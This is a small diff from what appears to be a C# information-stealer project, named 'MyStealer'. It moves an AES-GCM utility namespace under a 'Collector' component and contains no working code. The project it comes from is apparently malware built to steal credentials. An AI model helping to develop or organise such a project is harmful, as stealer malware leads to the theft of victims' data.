@@ -1,4 +1,4 @@
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
     /**
      * all parameter classes implement this.
